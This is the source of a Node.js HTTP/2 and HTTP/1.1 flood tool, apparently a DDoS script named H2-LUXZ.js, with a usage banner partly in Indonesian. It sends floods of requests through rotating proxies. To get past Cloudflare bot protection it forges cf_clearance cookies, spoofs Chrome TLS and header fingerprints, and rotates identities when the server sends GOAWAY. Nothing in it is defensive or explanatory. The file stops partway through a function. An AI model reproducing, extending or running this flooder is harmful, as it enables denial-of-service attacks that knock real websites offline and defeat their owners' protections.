const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const colors = require('colors');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e)
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;

const customIPindex = process.argv.indexOf('--ip');
const customIP = customIPindex !== -1 && customIPindex + 1 < process.argv.length ? process.argv[customIPindex + 1] : undefined;

const customUAindex = process.argv.indexOf('--useragent');
const customUA = customUAindex !== -1 && customUAindex + 1 < process.argv.length ? process.argv[customUAindex + 1] : undefined;

const forceHttpIndex = process.argv.indexOf('--http');
const useLegitHeaders = process.argv.includes('--flood');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const cookieFileIndex = process.argv.indexOf('--cookie-file');
const cookieFile = cookieFileIndex !== -1 && cookieFileIndex + 1 < process.argv.length ? process.argv[cookieFileIndex + 1] : undefined;

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
NEW BYPAS CF UPDATE 4,0 - HUMANIZED
By: @tyoobae
𝘛𝘐𝘠𝘖𝘕𝘦𝘵𝘸𝘰𝘳𝘬 | get worse

node H2-LUXZ.js GET URL 700 4 32 proxy.txt --debug --flood

PILIHAN OPSI PARAMETER:
=======================

--flood                 FLOODER HTTP/2 For Target
                        (Mode operasi utama pengujian beban HTTP/2)

--bfm true              Bypass BFM Mode
                        (Mengatasi sistem manajemen bot/fraud)

--delay 1-100           Set delay requests
                        (Mengatur jeda waktu dalam milidetik antar permintaan)

--http 1/2/mix          Set protocol HTTP Version
                        (Memilih versi protokol HTTP: 1.1, 2, atau gabungan)

--useragent             Pilihan user agent
                        (Simulasi jenis browser atau perangkat)

--ip                    hostname target
                        (Alamat IP atau nama host dari target yang diuji)

--header                modifikasi permintaan
                        (Menambah atau memodifikasi Header HTTP kustom)

--randrate              atur kecepatan acak
                        (Mengatur laju permintaan secara acak)

--cookie                mendapatkan cookie/Custom
                        (Menetapkan cookie HTTP sesi)

--cookie-file           file berisi cookie hasil solver manual
                        (Membaca cookie dari file untuk otentikasi manual)

--referer               atur sumber trafik permintaan
                        (Mengatur Header Referer)

--query                 parameter url tetap
                        (Menetapkan query string pada URL)

--full                  Full mode aktifkan semua fitur
                        (Mengaktifkan konfigurasi pengujian maksimum)

--debug                 Show debug script status
                        (Menampilkan status eksekusi yang rinci)
`);
    process.exit(1);
}

let hcookie = '';
let manualCookies = [];
let cookieRotationIndex = 0;

// Load manual cookies from file if provided
if (cookieFile && fs.existsSync(cookieFile)) {
    try {
        const cookieContent = fs.readFileSync(cookieFile, 'utf8');
        manualCookies = cookieContent.split('\n')
            .map(line => line.trim())
            .filter(line => line && !line.startsWith('#') && line.includes('cf_clearance'));
        console.log(`[INFO] Loaded ${manualCookies.length} manual cookies from file`);
    } catch (e) {
        console.log(`[ERROR] Failed to load cookie file: ${e.message}`);
    }
}

const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')

// Enhanced cookie handling for Turnstile/BFM simulation
function getCookie() {
    // Priority 1: Manual cookies from file
    if (manualCookies.length > 0) {
        const cookie = manualCookies[cookieRotationIndex % manualCookies.length];
        cookieRotationIndex++;
        return cookie;
    }
    
    // Priority 2: User provided cookie
    if (cookieValue) {
        if (cookieValue === '%RAND%') {
            return generateRealisticCFCookie();
        } else {
            return cookieValue;
        }
    }
    
    // Priority 3: Generated cookie if BFM flag is enabled
    if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
        return generateRealisticCFCookie();
    }
    
    return '';
}

// Generate realistic Cloudflare clearance cookie
function generateRealisticCFCookie() {
    const timestamp = Date.now();
    const timestampString = timestamp.toString().substring(0, 10);
    
    // Real CF cookie structure: cf_clearance={random}_{random}.{random}.{random}-{timestamp}-1.0-{random}+{random}=
    const part1 = randstr(22); // Usually 22 chars
    const part2 = randstr(1);  // Usually 1 char
    const part3 = randstr(3);  // Usually 3 chars
    const part4 = randstr(14); // Usually 14 chars
    const part5 = randstr(6);  // Usually 6 chars
    const part6 = randstr(80); // Usually 80 chars
    
    return `cf_clearance=${part1}_${part2}.${part3}.${part4}-${timestampString}-1.0-${part5}+${part6}=`;
}

hcookie = getCookie();

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

// Enhanced encodeSettings with random order and Chrome-like values
function encodeSettings(settings) {
    // Shuffle settings array to randomize order
    const shuffledSettings = [...settings];
    for (let i = shuffledSettings.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffledSettings[i], shuffledSettings[j]] = [shuffledSettings[j], shuffledSettings[i]];
    }
    
    const data = Buffer.alloc(6 * shuffledSettings.length)
    for (let i = 0; i < shuffledSettings.length; i++) {
        data.writeUInt16BE(shuffledSettings[i][0], i * 6)
        data.writeUInt32BE(shuffledSettings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

function encodePriority(streamId, exclusive, dependentStreamId, weight) {
    const payload = Buffer.alloc(5);
    payload.writeUInt32BE(dependentStreamId | (exclusive ? 0x80000000 : 0), 0);
    payload.writeUInt8(weight, 4);
    return encodeFrame(streamId, 2, payload, 0);
}

function encodeWindowUpdate(streamId, increment) {
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(increment, 0);
    return encodeFrame(streamId, 8, payload, 0);
}

const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Enhanced browser fingerprinting with full version list
function getBrowserFingerprint() {
    const browserVersion = getRandomInt(123, 127); // Chrome 123-127
    const patchVersion = getRandomInt(0, 9999);
    
    const fwfw = ['Google Chrome', 'Brave', 'Chromium'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    
    const isBrave = wfwf === 'Brave';
    const isChromium = wfwf === 'Chromium';
    
    // Chrome 125+ specific settings
    let brandValue, fullVersionList;
    
    if (browserVersion === 125) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not A(Brand";v="24", "Chromium";v="${browserVersion}"`;
        fullVersionList = `"${wfwf}";v="${browserVersion}.0.${patchVersion}.0", "Not A(Brand";v="24.0.0.0", "Chromium";v="${browserVersion}.0.${patchVersion}.0"`;
    } else if (browserVersion === 126) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not A.Brand";v="99", "Chromium";v="${browserVersion}"`;
        fullVersionList = `"${wfwf}";v="${browserVersion}.0.${patchVersion}.0", "Not A.Brand";v="99.0.0.0", "Chromium";v="${browserVersion}.0.${patchVersion}.0"`;
    } else if (browserVersion === 127) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
        fullVersionList = `"${wfwf}";v="${browserVersion}.0.${patchVersion}.0", "Not:A-Brand";v="8.0.0.0", "Chromium";v="${browserVersion}.0.${patchVersion}.0"`;
    } else {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not_A Brand";v="99", "Chromium";v="${browserVersion}"`;
        fullVersionList = `"${wfwf}";v="${browserVersion}.0.${patchVersion}.0", "Not_A Brand";v="99.0.0.0", "Chromium";v="${browserVersion}.0.${patchVersion}.0"`;
    }
    
    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

    const langValue = isBrave
        ? 'en-US,en;q=0.6'
        : 'en-US,en;q=0.9';
    
    const userAgent = customUA || `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.${patchVersion}.0 Safari/537.36`;
    
    return {
        browserVersion,
        wfwf,
        isBrave,
        isChromium,
        brandValue,
        fullVersionList,
        acceptHeaderValue,
        langValue,
        userAgent,
        secGpcValue: isBrave ? "1" : undefined,
        secChUaWow64: Math.random() > 0.5 ? "?0" : undefined // Windows 32-on-64 flag
    };
}

function buildRequest() {
    const fingerprint = getBrowserFingerprint();
    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".com" : refererValue;

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (hcookie || currentRefererValue) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }

    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
        `Accept: ${fingerprint.acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br, zstd\r\n' +
        `Accept-Language: ${fingerprint.langValue}\r\n` +
        'Cache-Control: max-age=0\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${fingerprint.userAgent}\r\n` +
        `sec-ch-ua: ${fingerprint.brandValue}\r\n` +
        `sec-ch-ua-full-version-list: ${fingerprint.fullVersionList}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform: "Windows"\r\n' + mysor1;
    
    if (fingerprint.secChUaWow64) {
        headers += `sec-ch-ua-wow64: ${fingerprint.secChUaWow64}\r\n`;
    }
    
    if (fingerprint.secGpcValue) {
        headers += `sec-gpc: ${fingerprint.secGpcValue}\r\n`;
    }

    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
    }

    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
    }

    const mmm = Buffer.from(`${headers}`, 'binary');
    return mmm;
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))

// Global fingerprint rotation for GOAWAY handling
let currentFingerprintId = 1;

function rotateFingerprint() {
    currentFingerprintId = (currentFingerprintId % 10) + 1;
    hcookie = getCookie(); // Rotate cookie as well
    console.log(`[FINGERPRINT] Rotated to ID: ${currentFingerprintId}`);
}

function go() {
    var [proxyHost, proxyPort] = '1.1.1.1:3128';

    if(customIP) {
        [proxyHost, proxyPort] = customIP.split(':');
    } else {
        [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    }

    let tlsSocket;
    let streamId = 1;
    let receivedGoaway = false;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            // Enhanced TLS configuration for better JA3/JA4 fingerprinting
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.hostname,
                // Chrome 125+ TLS cipher suites (JA3 fingerprint)
                ciphers: [
                    'TLS_AES_128_GCM_SHA256',
                    'TLS_AES_256_GCM_SHA384',
                    'TLS_CHACHA20_POLY1305_SHA256',
                    'ECDHE-ECDSA-AES128-GCM-SHA256',
                    'ECDHE-RSA-AES128-GCM-SHA256',
                    'ECDHE-ECDSA-AES256-GCM-SHA384',
                    'ECDHE-RSA-AES256-GCM-SHA384',
                    'ECDHE-ECDSA-CHACHA20-POLY1305',
                    'ECDHE-RSA-CHACHA20-POLY1305',
                    'ECDHE-RSA-AES128-SHA',
                    'ECDHE-RSA-AES256-SHA',
                    'AES128-GCM-SHA256',
                    'AES256-GCM-SHA384',
                    'AES128-SHA',
                    'AES256-SHA'
                ].join(':'),
                // Chrome 125+ signature algorithms (JA4 fingerprint)
                sigalgs: [
                    'ecdsa_secp256r1_sha256',
                    'rsa_pss_rsae_sha256',
                    'rsa_pkcs1_sha256',
                    'ecdsa_secp384r1_sha384',
                    'rsa_pss_rsae_sha384',
                    'rsa_pss_rsae_sha384',
                    'rsa_pkcs1_sha384',
                    'ecdsa_sha1',
                    'rsa_pss_rsae_sha256',
                    'rsa_pkcs1_sha256',
                    'rsa_pkcs1_sha1'
                ].join(':'),
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | 
                              crypto.constants.SSL_OP_NO_TICKET | 
                              crypto.constants.SSL_OP_NO_SSLv2 | 
                              crypto.constants.SSL_OP_NO_SSLv3 | 
                              crypto.constants.SSL_OP_NO_COMPRESSION |
                              crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                              crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false,
                ecdhCurve: 'auto',
                honorCipherOrder: true
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function doWrite() {
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    doWrite()
                                }, isFull ? 1000 : 1000 / ratelimit)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    doWrite()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                // Chrome 125+ specific HTTP/2 settings
                const settings = [
                    [1, 65536],     // HEADER_TABLE_SIZE - Chrome uses 65536
                    [2, 0],         // ENABLE_PUSH - Disabled
                    [3, 1000],      // MAX_CONCURRENT_STREAMS
                    [4, 6291456],   // INITIAL_WINDOW_SIZE - Chrome uses 6291456
                    [5, 16384],     // MAX_FRAME_SIZE - Chrome uses 16384
                    [6, 65535],     // MAX_HEADER_LIST_SIZE
                    [8, 1],         // ENABLE_CONNECT_PROTOCOL
                    [9, 100]        // SETTINGS_MAX_COOKIE_SIZE
                ];

                // Send WINDOW_UPDATE immediately after settings (browser-like behavior)
                const windowUpdateIncrement = 15663105; // Chrome default
                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(windowUpdateIncrement, 0)

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings(settings)),
                    encodeFrame(0, 8, updateWindow), // Connection-level window update
                    encodePriority(1, 0, 0, 255) // Send PRIORITY frame (browser-like)
                ];

                // Add occasional additional window updates
                if (Math.random() > 0.7) {
                    frames.push(encodeWindowUpdate(0, getRandomInt(1000000, 5000000)));
                }

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            
                            // Handle SETTINGS acknowledgment
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            
                            // Handle HEADERS frame (status codes)
                            if (frame.type == 1 && debugMode) {
                                try {
                                    const decoded = hpack.decode(frame.payload);
                                    const statusHeader = decoded.find(x => x[0] == ':status');
                                    if (statusHeader) {
                                        const status = statusHeader[1];
                                        if (!statuses[status]) statuses[status] = 0;
                                        statuses[status]++;
                                    }
                                } catch (e) {
                                    // Ignore decode errors
                                }
                            }
                            
                            // Smart GOAWAY handling
                            if (frame.type == 7) {
                                receivedGoaway = true;
                                if (debugMode) {
                                    if (!statuses["GOAWAY"]) statuses["GOAWAY"] = 0;
                                    statuses["GOAWAY"]++;
                                }
                                
                                // Rotate fingerprint before reconnecting
                                rotateFingerprint();
                                
                                // Send RST_STREAM for all active streams
                                const rstFrames = [];
                                for (let i = 1; i <= streamId; i += 2) {
                                    rstFrames.push(encodeRstStream(i, 3, 0));
                                }
                                
                                if (rstFrames.length > 0) {
                                    tlsSocket.write(Buffer.concat(rstFrames));
                                }
                                
                                // Delay reconnect slightly
                                setTimeout(() => {
                                    tlsSocket.end(() => { 
                                        tlsSocket.destroy(); 
                                        go();
                                    });
                                }, getRandomInt(100, 500));
                                
                                return;
                            }
                            
                            // Handle PING
                            if (frame.type == 6) {
                                tlsSocket.write(encodeFrame(0, 6, frame.payload, 1));
                            }
                            
                            // Handle WINDOW_UPDATE
                            if (frame.type == 8) {
                                // Send additional window update if needed
                                if (Math.random() > 0.8) {
                                    tlsSocket.write(encodeWindowUpdate(frame.streamId, getRandomInt(100000, 1000000)));
                                }
                            }

                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed || receivedGoaway) {
                        return
                    }
                    
                    const requests = []
                    const customHeadersArray = [];
                    if (customHeaders) {
                        const customHeadersList = customHeaders.split('#');
                        for (const header of customHeadersList) {
                            const [name, value] = header.split(':');
                            if (name && value) {
                                customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
                            }
                        }
                    }
                    
                    let currentRatelimit;
                    if (randrate !== undefined) {
                        currentRatelimit = getRandomInt(1, 90);
                    } else {
                        currentRatelimit = parseInt(ratelimit);
                    }
                    
                    const batchSize = isFull ? currentRatelimit : Math.min(currentRatelimit, 3);
                    
                    for (let i = 0; i < batchSize; i++) {
                        const fingerprint = getBrowserFingerprint();
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[Math.floor(Math.random() * ref.length)];
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".com" : refererValue;
                        
                        // Strict pseudo-header ordering: :method, :authority, :scheme, :path
                        const pseudoHeaders = [
                            [":method", reqmethod],
                            [":authority", url.hostname],
                            [":scheme", "https"],
                            [":path", query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : "")]
                        ];
                        
                        // Regular headers with random ordering (except priority headers)
                        const regularHeaders = [];
                        
                        // Add priority header (browser-like)
                        regularHeaders.push(["priority", "u=0, i"]);
                        
                        // Randomize order of common headers
                        const commonHeaders = [
                            ["cache-control", Math.random() < 0.4 ? "max-age=0" : "no-cache"],
                            ["sec-ch-ua", fingerprint.brandValue],
                            ["sec-ch-ua-mobile", "?0"],
                            ["sec-ch-ua-platform", '"Windows"'],
                            ["sec-ch-ua-full-version-list", fingerprint.fullVersionList],
                            ["upgrade-insecure-requests", "1"],
                            ["user-agent", fingerprint.userAgent],
                            ["accept", fingerprint.acceptHeaderValue],
                            ["sec-fetch-site", currentRefererValue ? ref1 : "none"],
                            ["sec-fetch-mode", "navigate"],
                            ["sec-fetch-user", "?1"],
                            ["sec-fetch-dest", "document"],
                            ["accept-encoding", "gzip, deflate, br, zstd"],
                            ["accept-language", fingerprint.langValue]
                        ];
                        
                        // Shuffle common headers (except keep some in semi-fixed positions)
                        const shuffledHeaders = [...commonHeaders];
                        for (let j = shuffledHeaders.length - 1; j > 0; j--) {
                            const k = Math.floor(Math.random() * (j + 1));
                            [shuffledHeaders[j], shuffledHeaders[k]] = [shuffledHeaders[k], shuffledHeaders[j]];
                        }
                        
                        // Add shuffled headers
                        regularHeaders.push(...shuffledHeaders);
                        
                        // Add conditional headers
                        if (fingerprint.secGpcValue) {
                            regularHeaders.push(["sec-gpc", fingerprint.secGpcValue]);
                        }
                        
                        if (fingerprint.secChUaWow64) {
                            regularHeaders.push(["sec-ch-ua-wow64", fingerprint.secChUaWow64]);
                        }
                        
                        if (hcookie) {
                            regularHeaders.push(["cookie", hcookie]);
                        }
                        
                        if (currentRefererValue) {
                            regularHeaders.push(["referer", currentRefererValue]);
                        }
                        
                        if (reqmethod === "POST") {
                            regularHeaders.push(["content-length", "0"]);
                        }
                        
                        // Add custom headers
                        customHeadersArray.forEach(header => {
                            const [key, value] = Object.entries(header)[0];
                            regularHeaders.push([key, value]);
                        });
                        
                        // Combine headers
                        const combinedHeaders = [...pseudoHeaders, ...regularHeaders].filter(a => a[1] != null);

                        function handleQuery(query) {
                            if (query === '1') {
                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                            } else if (query === '2') {
                                return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else if (query === '3') {
                                return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else {
                                return url.pathname;
                            }
                        }

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);

                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        
                        // Occasionally send PRIORITY frame after HEADERS (browser-like)
                        if (Math.random() > 0.7) {
                            requests.push(encodePriority(streamId, 0, 0, getRandomInt(0, 255)));
                        }
                        
                        streamId += 2;
                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            const nextDelay = isFull ? getRandomInt(700, 1200) : Math.max(300, 1000 / currentRatelimit);
                            setTimeout(() => {
                                doWrite();
                            }, nextDelay);
                        } else if (!receivedGoaway) {
                            tlsSocket.end(() => tlsSocket.destroy());
                        }
                    });
                }

                doWrite();
                
                // Send periodic PING frames (browser-like behavior)
                const pingInterval = setInterval(() => {
                    if (!tlsSocket.destroyed && !receivedGoaway) {
                        const pingData = crypto.randomBytes(8);
                        tlsSocket.write(encodeFrame(0, 6, pingData, 0));
                    } else {
                        clearInterval(pingInterval);
                    }
                }, getRandomInt(30000, 60000));

            }).on('error', (err) => {
                if (!receivedGoaway) {
                    rotateFingerprint();
                }
                tlsSocket.destroy();
            });
        });

        netSocket.write(`CONNECT ${url.hostname}:443 HTTP/1.1\r\nHost: ${url.hostname}:443\r\nProxy-Connection: Keep-Alive\r\nUser-Agent: Mozilla/5.0\r\n\r\n`);
    }).once('error', () => { 
        rotateFingerprint();
    }).once('close', () => {
        if (tlsSocket && !receivedGoaway) {
            tlsSocket.end(() => { 
                tlsSocket.destroy(); 
                setTimeout(go, getRandomInt(100, 300));
            });
        }
    });
}

function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
